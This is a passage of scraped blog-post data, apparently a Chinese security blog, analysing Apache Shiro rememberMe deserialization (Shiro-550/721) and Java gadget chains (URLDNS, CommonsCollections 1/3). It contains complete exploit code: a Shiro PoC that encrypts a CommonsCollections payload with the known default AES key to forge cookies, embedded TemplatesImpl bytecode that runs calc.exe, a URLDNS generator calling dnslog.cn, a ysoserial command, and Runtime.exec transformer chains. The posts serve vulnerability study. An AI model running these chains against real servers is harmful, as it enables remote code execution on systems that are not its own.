Base64.getDecoder().decode(\"yv66vgAAADQANQoACwAaCQAbABwIAB0KAB4AHwoAIAAhCAAiCgAgACMHACQKAAgAJQcAJgcAJwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAoAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEADVN0YWNrTWFwVGFibGUHACYHACQBAApTb3VyY2VGaWxlAQAXSGVsbG9UZW1wbGF0ZXNJbXBsLmphdmEMABMAFAcAKQwAKgArAQATSGVsbG8gVGVtcGxhdGVzSW1wbAcALAwALQAuBwAvDAAwADEBAAhjYWxjLmV4ZQwAMgAzAQATamF2YS9pby9JT0V4Y2VwdGlvbgwANAAUAQASSGVsbG9UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAKAAsAAAAAAAMAAQAMAA0AAgAOAAAAGQAAAAMAAAABsQAAAAEADwAAAAYAAQAAAAsAEAAAAAQAAQARAAEADAASAAIADgAAABkAAAAEAAAAAbEAAAABAA8AAAAGAAEAAAAMABAAAAAEAAEAEQABABMAFAABAA4AAABsAAIAAgAAAB4qtwABsgACEgO2AAS4AAUSBrYAB1enAAhMK7YACbEAAQAMABUAGAAIAAIADwAAAB4ABwAAAA8ABAAQAAwAEgAVABUAGAATABkAFAAdABYAFQAAABAAAv8AGAABBwAWAAEHABcEAAEAGAAAAAIAGQ==\"); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][] {code}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; //避免本地构造报错退出  Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[] { Templates.class }, new Object[] { obj }) }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); //避免本地构造报错退出  Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry tme = new TiedMapEntry(outerMap, \"keykey\"); Map expMap = new HashMap(); expMap.put(tme, \"valuevalue\");\t//为了调用hashCode()  outerMap.remove(\"keykey\");\t//因为LazyMap触发要求是获取不到这个value，所以要删除  Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); //替换真正的ChainedTransformer  f.setAccessible(true); f.set(transformerChain, transformers); // 生成序列化字符串  ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); // // 本地测试触发 // System.out.println(barr); // ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); // Object o = (Object)ois.readObject();  return barr.toByteArray(); } }   得到数据之后替换为rememberMe之后并没有执行命令，而是重定向到了首页，开启debug去看，得到一个报错\n原因是org.apache.shiro.io.ClassResolvingObjectInputStream这个类，他是个ObjectInputStream的子类，并且重写了resolveClass方法，这个方法是用于反序列化中寻找Class对象的方法。\nObjectInputStream使用的是org.apache.shiro.util.ClassUtils#forName来加载，而shiro的ClassResolvingObjectInputStream使用的是Java原生Class.forName，后者会导致ClassNotFoundException\n参考p神《Java安全漫谈 - 15.TemplatesImpl在Shiro中的利用》一文：\n 这里仅给出最后的结论:如果反序列化流中包含非ava自身的数组，则会出现无法加载类的错误。这就解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。\n 那么如何避免使用Transformer数组呢？\n修改CC3打shiro 先康康LazyMap的get方法：\n1 2 3 4 5 6 7 8 9  public Object get(Object key) { // create value for key if key is not currently in the map  if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); }   再康康ChainedTransformer的transform方法：\n1 2 3 4 5 6 7 8 9 10 11  public ChainedTransformer(Transformer[] transformers) { super(); iTransformers = transformers; } //…… public Object transform(Object object) { for (int i = 0; i \u003c iTransformers.length; i++) { object = iTransformers[i].transform(object); } return object; }   再去康康ConstantTransformer的transform方法：\n1 2 3 4 5 6 7 8  public ConstantTransformer(Object constantToReturn) { super(); iConstant = constantToReturn; } public Object transform(Object input) { return iConstant; }   本来的触发流程是：\nLazyMap.get(key)-\u003e\rChainedTransformer.transform(constantTransformer)-\u003e\rConstantTransformer.transform(instantiateTransformer)-\u003e\rInstantiateTransformer.transform(TrAXFilter.class)-\u003e\rTrAXFilter#TrAXFilter()-\u003e\r……\r-\u003eRCE\r但其实LazyMap.get()的时候 factory.transform(key)会把key当作transform的参数传入\n反观我们cc3里面的transformers数组，其实他长度只有1：\n1 2 3 4  Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[] { Templates.class },new Object[] {obj}) };   **所以new ConstantTransformer(TrAXFilter.class)这一步完全就可以使用LazyMap.get(TrAXFilter.class)来替代。**也就不需要transformer数组了\n给个自己改的poc：\nShiroPoc.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; import java.util.Base64; public class ShiroPoc { public static void main(String []args) throws Exception { //byte[] payloads = cc3.getpayload();  byte[] payloads = CommonsCollectionShiro.getpayload(); AesCipherService aes = new AesCipherService(); byte[] key = Base64.getDecoder().decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.println(ciphertext.toString()); //自动Base64  } }   CommonsCollectionShiro.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class CommonsCollectionShiro { public static void main(String[] args) throws Exception { String base64encodedString = Base64.getEncoder().encodeToString(getpayload()); System.out.println(base64encodedString); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static byte[] getpayload() throws Exception { byte[] code = Base64.getDecoder().decode(\"yv66vgAAADQANQoACwAaCQAbABwIAB0KAB4AHwoAIAAhCAAiCgAgACMHACQKAAgAJQcAJgcAJwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAoAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEADVN0YWNrTWFwVGFibGUHACYHACQBAApTb3VyY2VGaWxlAQAXSGVsbG9UZW1wbGF0ZXNJbXBsLmphdmEMABMAFAcAKQwAKgArAQATSGVsbG8gVGVtcGxhdGVzSW1wbAcALAwALQAuBwAvDAAwADEBAAhjYWxjLmV4ZQwAMgAzAQATamF2YS9pby9JT0V4Y2VwdGlvbgwANAAUAQASSGVsbG9UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAKAAsAAAAAAAMAAQAMAA0AAgAOAAAAGQAAAAMAAAABsQAAAAEADwAAAAYAAQAAAAsAEAAAAAQAAQARAAEADAASAAIADgAAABkAAAAEAAAAAbEAAAABAA8AAAAGAAEAAAAMABAAAAAEAAEAEQABABMAFAABAA4AAABsAAIAAgAAAB4qtwABsgACEgO2AAS4AAUSBrYAB1enAAhMK7YACbEAAQAMABUAGAAIAAIADwAAAB4ABwAAAA8ABAAQAAwAEgAVABUAGAATABkAFAAdABYAFQAAABAAAv8AGAABBwAWAAEHABcEAAEAGAAAAAIAGQ==\"); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][] {code}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); Transformer fakeTransformers = new ConstantTransformer(1); Class trAXFilter = TrAXFilter.class; Transformer instantiateTransformer = new InstantiateTransformer(new Class[] { Templates.class }, new Object[] { obj }); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, fakeTransformers); TiedMapEntry tme = new TiedMapEntry(outerMap, trAXFilter); Map expMap = new HashMap(); expMap.put(tme, \"valuevalue\");\t//为了调用hashCode()  outerMap.clear();\t//因为LazyMap触发要求是获取不到这个value，所以要删除  Field f = LazyMap.class.getDeclaredField(\"factory\"); //替换真正的key  f.setAccessible(true); f.set(outerMap, instantiateTransformer); // 生成序列化字符串  ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); // // 本地测试触发 // System.out.println(barr); // ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); // Object o = (Object)ois.readObject();  return barr.toByteArray(); } }   小手一抖，计算器到手\n","description":"","tags":["Shiro","Java","反序列化"],"title":"攻击Shiro思路和构造poc","uri":"/posts/%E6%94%BB%E5%87%BBshiro%E6%80%9D%E8%B7%AF%E5%92%8C%E6%9E%84%E9%80%A0poc/"},{"categories":["note"],"content":"概述  Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。\n 它的原理比较简单：为了让浏览器或服务器重启后用户不丢失登录状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字段中，下次读取时进行解密再反序列化。但是在Shiro 1.2.4版本之前内置了一个默认且固定的加密Key,导致攻击者可以伪造任意的rememberMe Cookie,进而触发反序列化漏洞。\nShiro反序列化漏洞目前为止有两个，Shiro-550(Apache Shiro \u003c 1.2.5)和Shiro-721( Apache Shiro \u003c 1.4.2 )。这两个漏洞主要区别在于Shiro550使用已知密钥撞，后者Shiro721是使用登录后rememberMe={value}去爆破正确的key值进而反序列化，对比Shiro550条件只要有足够密钥库（条件比较低）、Shiro721需要登录（要求比较高鸡肋）。\nApache Shiro \u003c 1.4.2默认使用AES/CBC/PKCS5Padding模式 Apache Shiro \u003e= 1.4.2默认使用AES/GCM/PKCS5Padding模式\nShiro-550：Hard Code-\u003eDeserialize-\u003eRCE Shiro 550 反序列化漏洞存在版本：shiro \u003c1.2.4，产生原因是因为shiro接受了Cookie里面rememberMe的值，然后去进行Base64解密后，再使用aes密钥解密后的数据，进行反序列化。\n这个aes密钥是硬编码（简称写死），也就是他密钥是写死在jar包里面的，众所周知AES 是对称加密，即加密密钥也同样是解密密钥，那如果我们能知道了这个密钥就可以伪造恶意cookie\n接下来我们从Cookie的加密和解密过程来了解shiro-550\nCookie加密过程 直接来看shiro的CookieRememberMeManager\n在org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity里面，存在一个将serialized数据Base64加密然后作为Cookie返回的行为\n我们看下哪些地方调用了这个方法，狂摁Ctrl+B:\norg.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity\u003c-\rorg.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity\u003c-\rorg.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(重载)\u003c-\rorg.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin\r看到这个函数名都知道是登陆成功调用的，如果继续跟下去的话，会有：\norg.apache.shiro.mgt.DefaultSecurityManager#rememberMeSuccessfulLogin \u003c-\rorg.apache.shiro.mgt.DefaultSecurityManager#onSuccessfulLogin\u003c-\rorg.apache.shiro.mgt.DefaultSecurityManager#login\u003c-\r……\r会追溯到Filter之类的，大概就是：\n登陆-\u003e登陆成功-\u003e设置Base64编码后的AES加密的Cookie\n在onSuccessfulLogin方法这里下个断点\n在调用rememberIdentity之前先调用isRememberMe判断了用户是否选择了RememberMe选项，如果选了进入rememberIdentity方法\n这个方法先创建一个PrincipalCollection对象，包含了登录信息。\n随后进入rememberIdentity方法\n这个方法调用convertPrincipalsToBytes把序列化后的PrincipalCollection对象加密，然后返回\n而这个seriallize方法，调用org.apache.shiro.mgt.AbstractRememberMeManager#getEncryptionCipherKey去获取加密的key\n跟进，发现直接返回了一个属性\n转到定义，这个属性貌似是预先定义好的，虽然没看出究竟是哪里定义的（其实是可以看到的，详见《构造shiro poc》)\n不过我们可以看到一个叫做DEFAULT_CIPHER_KEY_BYTES的东西，这个就是传说中的硬编码的shirokey\n之后就是调用rememberSerializedIdentity返回base64加密的cookie了。\n接下来康康解密过程：\nCookie解密过程 我们其实可以猜测，加密解密的功能实际上都是由这个org.apache.shiro.web.mgt.CookieRememberMeManager类来实现的，在这个类里面四处找一找，可以找到getRememberedSerializedIdentity方法里面有一行：\n这个很像获取Cookie然后去读取值的操作，在这里下个断点，带着Cookie访问服务，果然就断下来了\n单步跟进，发现他获取到了我们的Cookie：\n随后判断了一下我们Cookie的值是不是等于DELETED_COOKIE_VALUE (deleteMe)，如果不是则进行decode并且返回：\n返回到了这里：\n并且调用convertBytesToPrincipals（这个函数名字是不是很熟悉？），将Cookie的结果转化为凭据（PrincipalCollection对象）\n因为之前加密过程调用convertPrincipalsToBytes，是一个序列化过程，那这里显然就是一个反序列化过程，跟进：\n解密，而后反序列化；\n跟进，触发点在org.apache.shiro.io.DefaultSerializer#deserialize：\n1.2.5 版本修复 修改了org.apache.shiro.mgt.AbstractRememberMeManager的硬编码方式，并且去掉了默认key，采用随机生成的shiro AES key\n但是这个key是可以自定义的：\n1 2 3 4 5 6 7 8  private static final String ENCRYPTION_KEY = \"3AvVhmFLUs0KTA3Kprsdag==\"; public CookieRememberMeManager rememberMeManager() { CookieRememberMeManager cookieRememberMeManager = new CookieRememberMeManager(); cookieRememberMeManager.setCookie(rememMeCookie()); // remeberMe cookie 加密的密钥 各个项目不一样 默认AES算法 密钥长度（128 256 512）  cookieRememberMeManager.setCipherKey(Base64.decode(ENCRYPTION_KEY)); return cookieRememberMeManager; }   或者如果你使用了诸如Spring的框架： spring-shiro.xml 在安全管理器SecurityManager中加入rememberMeManager；\n添加rememberMeManager，调用getCipherKey()随机生成密钥。\n理论上只要AES加密钥泄露，都会导致反序列化漏洞，也就是说，只要你硬编码，就有可能有爆破的风险\nShiro-721：Padding Oracle Attack-\u003eShiro AES key-\u003eshiro550 这个就不是重点了，shiro721本来利用需要先登陆获得有效的rememberMe={value}去爆破正确的key值进而反序列化，利用十分鸡肋。\n关于Padding Oracle Attack看这篇：\npadding oracle和cbc翻转攻击\nCBC加密模式：\nCBC解密模式：\n大概过程是这样：\n 比如我们的明文为admin 则需要被填充为 admin\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b 一共11个\\x0b 如果我们输入一个错误的iv，依旧是可以解密的，但是middle和我们输入的iv经过异或后得到的填充值可能出现错误 比如本来应该是admin\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b 而我们错误的得到admin\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x3b\\x2c 这样解密程序往往会抛出异常(Padding Error) 应用在web里的时候，往往是302或是500报错 而正常解密的时候是200 所以这时，我们可以根据服务器的反应来判断我们输入的iv\n 如果发送的rememberMe可以正确解析\n否则会抛出异常，返回deleteMe\n通过这一点的不同，我们可以向服务发出一个oracle：“我这个iv解密出的padding对不对？”\n如果是对的，正确解析，如果是错的返回deleteMe，基于此反复发出Oracle来爆破iv，再控制iv来控制解密后的明文（也就是不需要key了）\n这里还有一点，为什么需要一个合法用户的rememberMe，因为Shiro会获取用户信息，如果不是合法用户也会返回异常从而抛出deleteMe，这样Oracle就没办法实现了。\nReferer：\n Java安全之Shiro 550反序列化漏洞分析 浅谈Shiro反序列化获取Key的方式 Shiro 721 Padding Oracle攻击漏洞分析 Shiro-721 RCE Via Padding Oracle Attack\n ","description":"","tags":["Shiro","Java","反序列化"],"title":"Shiro反序列化漏洞成因分析","uri":"/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E5%88%86%E6%9E%90/"},{"categories":["note"],"content":"这是一篇流水账，主要是记录下调试过程\ncc链的gadget：\nURLDNS利用链 URLDNS利用链特点：\n 使用Java内置的类构造，对第三方库没有依赖 在目标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞 比CommonCollection简单更容易上手  我们可以构造一个反序列化点：\n1 2 3 4 5 6 7 8 9  import java.io.FileInputStream; import java.io.ObjectInputStream; public class Helloworld{ public static void main(String[] args) throws Exception { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"yso.bin\")); ois.readObject(); } }   使用新下载的jar包生成反序列化payload：\njava -jar ysoserial-master-d367e379d9-1.jar URLDNS \"http://kopboi.dnslog.cn\" \u003e yso.bin\r运行即可看到dnslog的请求记录；\n在Hashmap类的readObject方法putVal()处下断点：\n最终在这里产生了DNS请求\nGadget：\nHashMap.readObject-\u003eHashMap.hash()-\u003eURL.hashCode()-\u003eURLStreamHandler.hashCode()-\u003eURL.getHostAddress()-\u003eInetAdress.getByName()\r但是如果是使用ysoserial生成反序列化数据的话，为啥不会产生DNS请求呢？\n原因是在实例化URL类的时候，在这里handler传入了自定义的handler，这里面重写了getHostAddress()所以不会产生DNS请求\n在getHostAddress方法的时候就会直接return null\nPoc 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55  import java.io.*; import java.lang.reflect.Field; import java.net.InetAddress; import java.net.URL; import java.net.URLConnection; import java.net.URLStreamHandler; import java.util.HashMap; import java.util.Base64; public class urldns { public static void main(String[] args) throws Exception { URLStreamHandler handler = new URLStreamHandler() { @Override protected URLConnection openConnection(URL u) { return null; } @Override protected synchronized InetAddress getHostAddress(URL u){ return null; } }; HashMap hm = new HashMap(); URL url = new URL(null,\"http://114.hsr2k5.dnslog.cn\\n\",handler); hm.put(url,url); //Reflections.setFieldValue(url,\"hashCode\",-1);  Field f = URL.class.getDeclaredField(\"hashCode\"); f.setAccessible(true); f.set(url, -1); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(hm); oos.close(); //序列化流写入文件  try { FileOutputStream fileOut = new FileOutputStream(\"D:\\\\tmp\\\\e.ser\"); ObjectOutputStream out = new ObjectOutputStream(fileOut); out.writeObject(hm); out.close(); fileOut.close(); System.out.println(\"Serialized data is saved in D:\\\\tmp\\\\e.ser\"); }catch(IOException i) { i.printStackTrace(); } // 本地测试触发  System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } }   CC1 反序列化链 https://www.mi1k7ea.com/2019/02/06/Java反序列化漏洞/\nhttps://pplsec.github.io/2018/08/20/Commons-Collections-JAVA-Unserialize/\n踩坑：cc1必须使用cc3.1的库，如果调用commons-collection4的话会失败\n漏洞点 Apache Commons Collections中有一个特殊的接口Transformer\n1 2 3  public interface Transformer { public Object transform(Object input); }   InvokerTransformer是实现了Transformer接口的一个类，这个类可以可以通过Java的反射机制来调用任意函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; } public Object transform(Object input) { if (input == null) { return null; } try { // 获取输入类的类对象  Class cls = input.getClass(); // 通过输入的方法名和方法参数，获取指定的反射方法对象  Method method = cls.getMethod(iMethodName, iParamTypes); // 反射调用指定的方法并返回方法调用结果  return method.invoke(input, iArgs); } catch (Exception ex) { // 省去异常处理部分代码  } }   可以看到该InvokerTransformer类是实现Transformer接口的（Transformer接口主要用于转换并返回一个给定的Object对象），且其中的transform()方法采用反射机制进行任意函数调用，这就是漏洞点所在\n几个涉及到的类和接口   Transformer\nTransformer是⼀个接口，它只有⼀个待实现的方法，作用是给定一个Object对象经过转换后同时也返回一个Object：\n1 2 3  public interface Transformer { public Object transform(Object input); }     ConstantTransformer\nConstantTransformer是实现了Transformer接口的⼀个类，它的过程就是在构造函数的时候传入一个对象，并在transform方法将这个对象再返回：\n1 2 3 4 5 6 7  public ConstantTransformer(Object constantToReturn) { super(); iConstant = constantToReturn; } public Object transform(Object input) { return iConstant; }     InvokerTransformer\n上文提到过了，可以通过反射执行任意方法的关键类\n  ChainedTransformer\nChainedTransformer也是实现了Transformer接口的一个类，它的作⽤是将内部的多个Transformer串在一起。\n我们只需要传入一个Transformer数组ChainedTransformer就可以实现依次的去调用每一个Transformer的transform方法。\n通俗来说就是，前一个回调返回的结果，作为后⼀个回调的参数传入\n     TransformedMap\nTransformedMap用于对Java标准数据结构Map做一个修饰，\n被修饰过的Map在添加新的元素时，将可以执行一个调用（调用一个实现了Transformer接口的对象）。\n只要调用TransformedMap的setValue/put/putAll中的任意方法都会调用InvokerTransformer类的transform方法，从而也就会触发命令执行\n我们通过下面这行代码对innerMap进行修饰，传出的outerMap即是修饰后的Map:\n1  Map outerMap = TransformedMap.decorate(innerMap, keyTransformer, valueTransformer);     LazyMap\nLazyMap是在其get方法中执行的 factory.transform 。\n1  Map outerMap = LazyMap.decorate(innerMap, transformerChain);   其实这也好理解，LazyMap 的作用是“懒加载”，在get找不到值的时候，它会调用 factory.transform 方法去获取一个值\n  寻找调用 我们既然想要调用InvokerTransformer.transform()，我就需要寻找其他类有没有可控对象.transform()这种调用，搜索可以得到比较明显的两个：\n TransformedMap：  1 2 3 4 5 6 7 8 9 10 11  public class TransformedMap extends AbstractInputCheckedMapDecorator implements Serializable { //……  protected Object checkSetValue(Object value) { return valueTransformer.transform(value); } } //AbstractInputCheckedMapDecorator.java： public Object setValue(Object value) { value = parent.checkSetValue(value); return entry.setValue(value); }    Lazymap:  1 2 3 4 5 6 7 8 9 10 11  public class LazyMap extends AbstractMapDecorator implements Map, Serializable { public Object get(Object key) { // create value for key if key is not currently in the map  if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } }   TransformedMap调用链 Demo p神知识星球的demo：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; class CommonCollections1 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"C:\\\\Windows\\\\System32\\\\calc.exe\"}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\"test\", \"xxxx\"); } }   如果熟悉几个类的作用，理解这个demo就很简单了：\n 先创建一个ChainedTransformer对象， 第一个参数是ConstantTransformer对象来获取Runtime对象 第二个参数InvokerTransformer对象执行Runtime.exec方法 最后通过向TransformedMap.decorate装饰过后的Map添加元素来触发transform回调ChainedTransformer构造好的chain  但是这个demo是存在问题的：\n第二步Runtime.getRuntime()获取到的是一个Runtime对象，但是这个对象本身是没有实现Serializable接口的，序列化时会导致失败。\n所以上述demo应当改为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; class CommonCollections1 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class,Object[].class},new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\",}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\"test\", \"xxxx\"); } }    构造一个ConstantTransformer对象，把Runtime的Class对象传进去，在transform()时，始终会返回这个对象； 构造一个InvokerTransformer对象，待调用方法名为getMethod，参数为getRuntime，在transform()时，传入第一步的结果，此时的input应该是java.lang.Runtime，但经过getClass()之后，cls为java.lang.Class，之后getMethod()只能获取java.lang.Class的方法，因此才会定义的待调用方法名为getMethod，然后其参数才是getRuntime，它得到的是getMethod这个方法的Method对象，invoke()调用这个方法，最终得到的才是getRuntime这个方法的Method对象； 构造一个InvokerTransformer对象，待调用方法名为invoke，参数为空，在transform()时，传入第二步的结果，同理，cls将会是java.lang.reflect.Method，再获取并调用它的invoke()方法，实际上是调用上面的getRuntime()拿到Runtime对象； 构造一个InvokerTransformer对象，待调用方法名为exec，参数为命令字符串，在transform()时，传入第三步的结果，获取java.lang.Runtime的exec方法并传参调用； 最后把它们组装成一个数组全部放进ChainedTransformer中，在transform()时，会将前一个元素的返回结果作为下一个的参数，刚好满足需求。  在这个demo当中，通过手动调用outerMap.put方法来触发transform回调，但是在实战当中，我们需要寻找在反序列化过程中会有类似操作的一个类；\nAnnotationInvocationHandler构造触发点  此类在jdk8u71之后删除了memberValue.setValue()，所以利用版本需要jdk\u003c8u71，这里使用jdk8u60\n sun.reflect.annotation.AnnotationInvocationHandler类实现了java.lang.reflect.InvocationHandler(Java动态代理)接口和java.io.Serializable接口，它还重写了readObject方法，在readObject方法中还间接的调用了TransformedMap中MapEntry的setValue方法，从而也就触发了transform方法，完成了整个攻击链的调用。\n这里的memberValues是经过var1.defaultReadObject()得来的，也就是我们构造好的带有恶意攻击链的TransformedMap对象\n要进入到setValue，需要让var7不为null，只需要满足以下两个条件：\n  